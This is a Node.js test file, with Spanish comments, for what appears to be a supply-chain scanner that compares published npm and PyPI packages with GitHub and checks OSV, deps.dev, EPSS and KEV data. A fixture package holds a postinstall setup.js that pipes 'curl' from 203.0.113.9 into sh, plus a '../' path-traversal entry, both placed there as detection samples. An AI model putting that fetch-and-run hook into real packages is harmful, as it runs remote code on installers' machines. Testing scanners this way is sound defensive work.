'use strict';
// Más allá del repo: paquete publicado, avisos del propio proyecto, dependencias
// indirectas sin lockfile y señales de explotación. La red se simula con un fetch falso.
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('zlib');
const fx = require('./helpers/fixtures');

const SHA = 'a'.repeat(40);
const REF = { owner: 'acme', repo: 'tool', commit: SHA };

function tgz(files, top = 'package') {
  const blocks = [];
  for (const [name, content] of Object.entries(files)) {
    const body = Buffer.from(content);
    const h = Buffer.alloc(512);
    h.write(`${top ? `${top}/` : ''}${name}`, 0, 100);
    h.write('0000644\0', 100);
    h.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124);
    h.write('0', 156);
    h.write('ustar\0', 257);
    blocks.push(h, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(blocks));
}

const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

function withFetch(t, handler) {
  const orig = globalThis.fetch;
  const prev = process.env.OMINOUS_OFFLINE;
  const calls = [];
  process.env.OMINOUS_OFFLINE = '0';
  globalThis.fetch = async (url, opts = {}) => { calls.push({ url: String(url), body: opts.body }); return handler(new URL(String(url)), opts); };
  t.after(() => { globalThis.fetch = orig; if (prev === undefined) delete process.env.OMINOUS_OFFLINE; else process.env.OMINOUS_OFFLINE = prev; });
  return calls;
}

const fresh = () => {
  for (const m of ['../lib/beyond', '../lib/deps', '../lib/depsdev', '../lib/analyzer']) delete require.cache[require.resolve(m)];
  return { beyond: require('../lib/beyond'), deps: require('../lib/deps'), depsdev: require('../lib/depsdev') };
};

test('paquete de npm: script de instalación y código que no están en GitHub', async (t) => {
  const index = 'module.exports = (s) => s.toLowerCase();\n';
  const repo = fx.write(fx.tmpDir('pub'), {
    'package.json': JSON.stringify({ name: 'acme-tool', version: '1.0.0', repository: 'git+https://github.com/acme/tool.git', scripts: { test: 'node test.js' } }),
    'index.js': index,
  });
  t.after(() => fx.rm(repo));
  const pkg = tgz({
    'package.json': JSON.stringify({ name: 'acme-tool', version: '1.0.1', scripts: { postinstall: 'node setup.js' } }),
    'index.js': index,
    'setup.js': "require('child_process').execSync('curl -s http://203.0.113.9/x.sh | sh');\n",
    '../escape.js': 'x',
  });
  withFetch(t, (u) => {
    if (u.hostname === 'registry.npmjs.org' && u.pathname === '/acme-tool/latest') return json({ name: 'acme-tool', version: '1.0.1', repository: { url: 'git+https://github.com/acme/tool.git' }, dist: { tarball: 'https://registry.npmjs.org/acme-tool/-/acme-tool-1.0.1.tgz' } });
    if (u.hostname === 'registry.npmjs.org') return new Response(pkg);
    if (u.hostname === 'api.osv.dev') return json({ results: [{}, {}] });
    return json({}, 404);
  });
  const { beyondRepo } = fresh().beyond;
  const { analyzeTree } = require('../lib/analyzer');
  const r = await analyzeTree(repo, null, () => {}, { ref: REF });
  const pub = r.threats.filter((x) => x.rule === 'published-diff' || x.published);
  assert.ok(pub.some((x) => x.severity === 'high' && /"postinstall" distinto/.test(x.title) && /en GitHub no existe/.test(x.description)), 'postinstall nuevo');
  assert.ok(pub.some((x) => x.published && x.file === 'npm:acme-tool@1.0.1/setup.js' && /no está en GitHub/.test(x.title)), 'reglas sobre setup.js del paquete');
  assert.ok(!pub.some((x) => /index\.js/.test(x.file)), 'los ficheros idénticos no se repasan');
  assert.ok(!pub.some((x) => /escape/.test(String(x.file) + x.snippet)), 'rutas con .. se ignoran');
  assert.ok(pub.some((x) => x.severity === 'info' && /trae 1 fichero/.test(x.title) && x.snippet === 'setup.js'));
  assert.ok(r.coverage.some((c) => c.label === 'Paquete publicado en npm' && /acme-tool@1\.0\.1: 3 ficheros/.test(c.detail)));
  assert.equal(pub.find((x) => x.rule === 'published-diff').explain.name, 'El paquete publicado no coincide con GitHub');
  assert.equal(typeof beyondRepo, 'function');
});

test('paquete de npm de otro repo: no se compara; sin conexión no se pide nada', async (t) => {
  const repo = fx.write(fx.tmpDir('pub2'), { 'package.json': JSON.stringify({ name: 'chalk', version: '5.0.0' }) });
  t.after(() => fx.rm(repo));
  const calls = withFetch(t, (u) => (u.pathname === '/chalk/latest' ? json({ name: 'chalk', version: '5.3.0', repository: 'chalk/chalk' }) : json({ results: [{}, {}] })));
  const { beyondRepo } = fresh().beyond;
  const r = await beyondRepo(repo, REF, () => ({ vulns: [], threats: [] }));
  assert.equal(r.threats.length, 0);
  assert.match(r.coverage[0].detail, /no enlaza a este repo/);
  assert.ok(!calls.some((c) => /\.tgz$/.test(c.url)));
  process.env.OMINOUS_OFFLINE = '1';
  const n = calls.length;
  assert.deepEqual(await beyondRepo(repo, REF, () => ({})), { vulns: [], threats: [], coverage: [] });
  assert.equal(calls.length, n);
});

test('PyPI: un .pth en el sdist que no está en GitHub', async (t) => {
  const repo = fx.write(fx.tmpDir('pypi'), { 'pyproject.toml': '[build-system]\nrequires = ["hatchling"]\n\n[project]\nname = "acme_tool"\nversion = "0.3.0"\n', 'acme_tool/__init__.py': 'X = 1\n' });
  t.after(() => fx.rm(repo));
  const sdist = tgz({ 'pyproject.toml': '[project]\nname = "acme_tool"\n', 'acme_tool/__init__.py': 'X = 1\n', 'acme_tool_init.pth': 'import os\n', 'PKG-INFO': 'Name: acme_tool\n' }, 'acme_tool-0.3.0');
  const calls = withFetch(t, (u) => {
    if (u.hostname === 'pypi.org') return json({ info: { name: 'acme_tool', version: '0.3.0', project_urls: { Source: 'https://github.com/Acme/Tool' } }, urls: [{ packagetype: 'bdist_wheel', url: 'https://files.pythonhosted.org/x.whl' }, { packagetype: 'sdist', url: 'https://files.pythonhosted.org/packages/acme_tool-0.3.0.tar.gz' }] });
    if (u.hostname === 'files.pythonhosted.org') return new Response(sdist);
    if (u.hostname === 'api.osv.dev' && u.pathname === '/v1/querybatch') return json({ results: [{ vulns: [{ id: 'GHSA-aaaa-bbbb-cccc' }] }, {}] });
    if (u.hostname === 'api.osv.dev') return json({ id: 'GHSA-aaaa-bbbb-cccc', summary: 'Path traversal en acme_tool', aliases: ['CVE-2024-0001'], database_specific: { severity: 'HIGH' } });
    return json({}, 404);
  });
  const { beyond } = fresh();
  assert.equal(beyond.pythonName(repo), 'acme_tool');
  const r = await beyond.beyondRepo(repo, REF, () => ({ vulns: [], threats: [] }));
  assert.ok(r.threats.some((x) => x.severity === 'high' && x.file === 'pypi:acme_tool@0.3.0/acme_tool_init.pth'));
  const own = r.vulns.find((x) => x.rule === 'repo-vuln');
  assert.ok(own && own.severity === 'high' && /en el commit aaaaaaaaaa/.test(own.title) && own.osv[0].aliases[0] === 'CVE-2024-0001');
  const q = JSON.parse(calls.find((c) => c.url.endsWith('/querybatch')).body).queries;
  assert.deepEqual(q, [{ commit: SHA }, { package: { name: 'acme_tool', ecosystem: 'PyPI' }, version: '0.3.0' }]);
  assert.ok(r.coverage.some((c) => /Vulnerabilidades del propio proyecto/.test(c.label) && c.status === 'ok'));
});

test('sin lockfile: deps.dev resuelve las dependencias indirectas y se consultan en OSV', async (t) => {
  const repo = fx.write(fx.tmpDir('dd'), { 'package.json': JSON.stringify({ name: 'x', private: true, dependencies: { express: '^4.17.0', local: 'file:../local' } }) });
  t.after(() => fx.rm(repo));
  const calls = withFetch(t, (u, opts) => {
    if (u.hostname === 'api.deps.dev' && u.pathname.endsWith('/express')) return json({ versions: ['4.16.0', '4.17.1', '4.18.2', '5.0.0'].map((v) => ({ versionKey: { version: v } })) });
    if (u.hostname === 'api.deps.dev') return json({ nodes: [{ versionKey: { name: 'express', version: '4.18.2' }, relation: 'SELF' }, { versionKey: { name: 'qs', version: '6.10.3' }, relation: 'DIRECT' }, { versionKey: { name: 'side-channel', version: '1.0.4' }, relation: 'INDIRECT' }] });
    if (u.pathname === '/v1/querybatch') {
      const qs = JSON.parse(opts.body).queries;
      return json({ results: qs.map((x) => (x.package.name === 'qs' ? { vulns: [{ id: 'GHSA-hrpp-h998-j3pp' }] } : {})) });
    }
    if (u.hostname === 'api.osv.dev') return json({ id: 'GHSA-hrpp-h998-j3pp', summary: 'qs prototype pollution', aliases: ['CVE-2022-24999'], database_specific: { severity: 'HIGH' }, affected: [{ package: { name: 'qs' }, ranges: [{ events: [{ introduced: '0' }, { fixed: '6.10.3' }] }] }] });
    if (u.hostname === 'api.first.org') return json({ data: [{ cve: 'CVE-2022-24999', epss: '0.61', percentile: '0.98' }] });
    return json({}, 404);
  });
  const { deps } = fresh();
  const r = await deps.auditDependencies(repo, ['package.json']);
  assert.ok(calls.some((c) => c.url.endsWith('/versions/4.18.2:dependencies')), 'elige la versión más alta del rango');
  assert.ok(!calls.some((c) => /local/.test(c.url)), 'file: no se resuelve');
  const f = r.findings.find((x) => /^qs@/.test(x.title));
  assert.ok(f, 'vulnerabilidad en una dependencia indirecta');
  assert.match(f.fix.text, /la trae express@4\.18\.2/);
  assert.deepEqual(r.summary.transitive, { status: 'ok', detail: '2 dependencias indirectas de 1 directas sin lockfile' });
  const ex = await deps.exploitSignals(r.findings);
  assert.equal(ex.kev, 0);
  assert.match(f.description, /^CVE-2022-24999 tiene una probabilidad de explotación del 61 %/);
  assert.equal(f.osv[0].epss.pct, 0.98);
});

test('KEV: una CVE que se está explotando sube la gravedad, nunca la baja', async (t) => {
  withFetch(t, () => { throw new TypeError('Failed to fetch'); });
  const { deps } = fresh();
  const kev = require('../data/kev.json');
  const cve = Object.keys(kev.cves)[0];
  const f = [
    { severity: 'medium', title: 'a@1 tiene 1 vulnerabilidad conocida', description: 'x', osv: [{ id: 'GHSA-x', aliases: [cve] }] },
    { severity: 'critical', title: 'b@1', description: 'y', osv: [{ id: cve, aliases: [] }] },
    { severity: 'low', title: 'c@1', description: 'z', osv: [{ id: 'GHSA-y', aliases: ['CVE-1999-0000'] }] },
  ];
  const r = await deps.exploitSignals(f);
  assert.equal(f[0].severity, 'high');
  assert.match(f[0].title, /se está explotando$/);
  assert.equal(f[0].osv[0].kev, kev.cves[cve]);
  assert.equal(f[1].severity, 'critical');
  assert.equal(f[2].severity, 'low');
  assert.equal(r.kev, 2);
  assert.equal(r.epss, null, 'EPSS caído: se informa, no se inventa');
});

test('semver: la versión que instalaría npm hoy', () => {
  const { maxSatisfying } = fresh().depsdev;
  const vs = ['0.1.0', '0.1.5', '0.2.0', '1.2.3', '1.2.9', '1.3.0', '2.0.0-beta.1', '2.0.0', '2.1.0'];
  assert.equal(maxSatisfying(vs, '^1.2.3'), '1.3.0');
  assert.equal(maxSatisfying(vs, '~1.2.3'), '1.2.9');
  assert.equal(maxSatisfying(vs, '^0.1.0'), '0.1.5');
  assert.equal(maxSatisfying(vs, '>=1.3 <2'), '1.3.0');
  assert.equal(maxSatisfying(vs, '1.x || ^2'), '2.1.0');
  assert.equal(maxSatisfying(vs, '*'), '2.1.0');
  assert.equal(maxSatisfying(vs, '^3'), null);
  assert.equal(maxSatisfying(['2.0.0-beta.1'], '^2.0.0-beta.1'), '2.0.0-beta.1');
  assert.equal(maxSatisfying(['2.0.0-beta.1'], '^1 || >=2'), null, 'prerelease solo si el rango la nombra');
});
